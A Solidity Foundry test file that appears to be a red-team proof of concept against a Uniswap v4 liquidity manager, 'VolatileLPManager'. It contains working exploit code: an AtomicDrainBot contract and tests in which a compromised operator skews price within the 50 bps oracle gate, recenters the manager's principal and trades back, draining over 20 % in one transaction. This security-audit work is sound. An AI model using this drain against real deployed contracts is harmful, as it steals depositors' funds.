// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console2} from "forge-std/Test.sol";
import {RedTeamBase} from "./RedTeamTask053.t.sol";
import {MockERC20} from "./helpers/Mocks.sol";
import {VolatileLPManager} from "../src/VolatileLPManager.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice The compromised operator as a CONTRACT: skew, recenter, unwind, repeat — all in one
/// transaction. Nothing off-chain can interpose between the operations, so a per-operation bound is
/// not a rate limit; `nonReentrant` does not apply because the calls are sequential, not nested.
contract AtomicDrainBot {
    using StateLibrary for IPoolManager;

    IPoolManager immutable PM;
    PoolSwapTest immutable ROUTER;
    VolatileLPManager immutable MGR;
    PoolKey key;
    bytes32 immutable SALT;

    constructor(IPoolManager pm, PoolSwapTest r, VolatileLPManager m, PoolKey memory k, bytes32 salt) {
        PM = pm;
        ROUTER = r;
        MGR = m;
        key = k;
        SALT = salt;
        IERC20(Currency.unwrap(k.currency0)).approve(address(r), type(uint256).max);
        IERC20(Currency.unwrap(k.currency1)).approve(address(r), type(uint256).max);
    }

    function run(uint256 ops, int24 edge) external {
        for (uint256 i = 0; i < ops; ++i) {
            if (i % 2 == 0) {
                _to(edge);
                _recenter(edge - 1, edge);
                _to(-edge);
            } else {
                _recenter(-edge, -edge + 1);
                _to(edge);
            }
        }
    }

    function _to(int24 t) internal {
        uint160 want = TickMath.getSqrtPriceAtTick(t);
        (uint160 cur,,,) = PM.getSlot0(key.toId());
        if (cur == want) return;
        ROUTER.swap(
            key,
            SwapParams({zeroForOne: want < cur, amountSpecified: -int256(1e29), sqrtPriceLimitX96: want}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
    }

    function _recenter(int24 tl, int24 tu) internal {
        MGR.recenter(
            VolatileLPManager.RecenterParams({
                salt: SALT,
                newTickLower: tl,
                newTickUpper: tu,
                zeroForOne: false,
                swapAmountIn: 0,
                swapPriceLimit: 0,
                minAmountOut: 0,
                minLiquidity: 0
            })
        );
    }
}

/// @notice TARGET 1 — residual extraction that stays INSIDE the 50 bps spot gate.
///
/// Shape of the attack, unchanged from H-1 except that the skew is small enough to be vouched for:
///   1. the operator (with its own capital, no manager involvement) skews the pool to +49 bps;
///   2. a SWAPLESS `recenter` re-deploys the manager's whole principal into the narrowest legal range
///      sitting AT that skew — a bid to buy currency0 at a ~48.5 bps premium;
///   3. the operator trades the price back through that fresh liquidity and pockets the premium.
/// Every call succeeds. `ChainlinkPriceOracle._checkSpot` vouches for the pool at every add.
///
/// The band is two-sided (|pool − ref| ≤ 50 bps), so the price never has to be pushed back to the
/// reference: the return leg lands on the OPPOSITE edge, which is the setup for the next operation.
/// The attacker therefore pays the skew cost once and harvests one residual per operation forever.
contract RedTeamT1Residual is RedTeamBase {
    int24 internal constant EDGE = 49; // 1.0001^49 = +49.12 bps — just inside the 50 bps tolerance

    // ────────── (a) one operation ──────────

    function test_T1a_oneOperation_residual() public {
        _boot(100, 1, 4_000e18, 0, 1_000e18); // 0.01 % fee, spacing 1, thin pool, all-currency1 principal
        _openAsOwner(-1, 0, 1_000e18);

        uint256 m0 = _managerValue();
        uint256 b0 = _botValue();

        uint256 stolen = _oneLegUp();

        console2.log("--- T1a: one swapless operation inside the 50 bps gate ---");
        console2.log("manager value before      ", m0);
        console2.log("manager value after       ", _managerValue());
        console2.log("manager loss (wei)        ", m0 - _managerValue());
        console2.log("manager loss (bps)        ", (m0 - _managerValue()) * 10_000 / m0);
        console2.log("attacker gain (wei)       ", _botValue() - b0);
        stolen;

        assertLt(_managerValue(), m0, "manager lost value through a fully vouched-for operation");
    }

    /// @dev The control: the identical price round trip WITHOUT the operator's recenter. If the manager
    /// still loses here, the loss is ordinary toxic flow and not the gate's residual.
    function test_T1b_control_priceRoundTripWithoutRecenter() public {
        _boot(100, 1, 4_000e18, 0, 1_000e18);
        _openAsOwner(-1, 0, 1_000e18);

        uint256 m0 = _managerValue();
        _swapTo(EDGE);
        _swapTo(-EDGE);
        _swapTo(0);

        console2.log("--- T1b: control, same price path, no operator op ---");
        console2.log("manager value before      ", m0);
        console2.log("manager value after       ", _managerValue());
        assertGe(_managerValue() + 1, m0, "no operator op == no loss");
    }

    // ────────── (d) repetition: the per-operation bound compounds ──────────

    function test_T1d_repetition_compoundsWithoutBound() public {
        _boot(100, 1, 4_000e18, 0, 1_000e18);
        _openAsOwner(-1, 0, 1_000e18);

        uint256 m0 = _managerValue();
        uint256 b0 = _botValue();

        console2.log("--- T1d: the same operation, repeated (one tx per line) ---");
        for (uint256 i = 0; i < 40; ++i) {
            if (i % 2 == 0) _oneLegUp();
            else _oneLegDown();
            if (i % 5 == 4) {
                console2.log(" ops", i + 1);
                console2.log("   manager value ", _managerValue());
                console2.log("   drained (bps) ", (m0 - _managerValue()) * 10_000 / m0);
            }
        }
        console2.log("manager value before      ", m0);
        console2.log("manager value after 40 ops", _managerValue());
        console2.log("drained (bps of portfolio)", (m0 - _managerValue()) * 10_000 / m0);
        console2.log("attacker gain (wei)       ", _botValue() - b0);

        assertLt(_managerValue() * 100, m0 * 90, "> 10 % of the portfolio drained through the gate");
    }

    /// @dev The same drain, but issued by a contract operator so that all 60 operations land in ONE
    /// transaction. There is no cooldown, no per-epoch cap and no value floor on an operator op, and
    /// `nonReentrant` does not bite: the calls are sequential, not nested.
    function test_T1c_wholeDrainInASingleTransaction() public {
        _boot(100, 1, 4_000e18, 0, 1_000e18);
        _openAsOwner(-1, 0, 1_000e18);

        AtomicDrainBot drainer = new AtomicDrainBot(IPoolManager(address(pm)), swapRouter, mgr, key, SALT);
        MockERC20(Currency.unwrap(c0)).mint(address(drainer), 1e30);
        MockERC20(Currency.unwrap(c1)).mint(address(drainer), 1e30);
        vm.prank(owner);
        mgr.setOperator(address(drainer), true);

        uint256 m0 = _managerValue();
        drainer.run(60, EDGE); // ONE external transaction

        console2.log("--- T1c: 60 operator ops in a single transaction ---");
        console2.log("manager value before      ", m0);
        console2.log("manager value after       ", _managerValue());
        console2.log("drained (bps of portfolio)", (m0 - _managerValue()) * 10_000 / m0);
        assertLt(_managerValue() * 100, m0 * 80, "> 20 % gone in one transaction");
    }

    // ────────── (a) range width ──────────

    function test_T1e_scaling_rangeWidth() public {
        console2.log("--- T1e: loss per operation vs range width (fee 0.01 %, thin pool) ---");
        int24[4] memory widths = [int24(1), int24(10), int24(50), int24(200)];
        for (uint256 i = 0; i < widths.length; ++i) {
            _boot(100, widths[i], 4_000e18, 0, 1_000e18);
            _openAsOwner(-widths[i], 0, 1_000e18);
            uint256 m0 = _managerValue();
            _oneLegUpWidth(widths[i]);
            uint256 lost = m0 > _managerValue() ? m0 - _managerValue() : 0;
            console2.log("  spacing/width (ticks)", uint256(uint24(widths[i])));
            console2.log("     loss (bps)        ", lost * 10_000 / m0);
        }
    }

    // ────────── (b) fee tier ──────────

    function test_T1f_scaling_feeTier() public {
        console2.log("--- T1f: loss per operation vs pool fee (narrowest legal range) ---");
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];
        int24[4] memory spacings = [int24(1), int24(10), int24(60), int24(200)];
        for (uint256 i = 0; i < fees.length; ++i) {
            _boot(fees[i], spacings[i], 4_000e18, 0, 1_000e18);
            _openAsOwner(-spacings[i], 0, 1_000e18);
            uint256 m0 = _managerValue();
            _oneLegUpWidth(spacings[i]);
            uint256 lost = m0 > _managerValue() ? m0 - _managerValue() : 0;
            console2.log("  fee (pips)           ", uint256(fees[i]));
            console2.log("     loss (bps)        ", lost * 10_000 / m0);
        }
    }

    // ────────── (c) the manager's share of pool liquidity ──────────

    function test_T1g_scaling_poolDepth() public {
        console2.log("--- T1g: attacker P&L vs pool depth (manager principal fixed at 1_000e18) ---");
        uint256[4] memory depths = [uint256(2_000e18), 20_000e18, 200_000e18, 2_000_000e18];
        for (uint256 i = 0; i < depths.length; ++i) {
            _boot(100, 1, depths[i], 0, 1_000e18);
            _openAsOwner(-1, 0, 1_000e18);
            uint256 m0 = _managerValue();
            uint256 b0 = _botValue();
            _oneLegUp();
            uint256 lost = m0 > _managerValue() ? m0 - _managerValue() : 0;
            console2.log("  pool full-range liquidity", depths[i]);
            console2.log("     manager loss (bps)    ", lost * 10_000 / m0);
            if (_botValue() >= b0) console2.log("     attacker PROFIT (wei) ", _botValue() - b0);
            else console2.log("     attacker LOSS (wei)   ", b0 - _botValue());
        }
    }

    // ────────── legs ──────────

    /// @dev One extraction with the pool skewed UP: pump to +49 bps, recenter the principal into the
    /// narrowest range at that price (a bid), sell into it down to the opposite edge of the band.
    function _oneLegUp() internal returns (uint256) {
        return _oneLegUpWidth(1);
    }

    function _oneLegUpWidth(int24 w) internal returns (uint256) {
        _swapTo(EDGE); // pump to +49 bps — the most the gate will vouch for
        int24 up = (EDGE / w) * w; // the highest legal range boundary still inside the band
        _recenterAsBot(up - w, up);
        _swapTo(-EDGE); // trade back through it, landing on the opposite edge of the band
        return 0;
    }

    /// @dev The mirror: pool sitting at −49 bps, principal is now currency0, recenter into the range
    /// just above spot (an ask) and buy it out back up to +49 bps.
    function _oneLegDown() internal returns (uint256) {
        _recenterAsBot(-EDGE, -EDGE + 1);
        _swapTo(EDGE);
        return 0;
    }
}
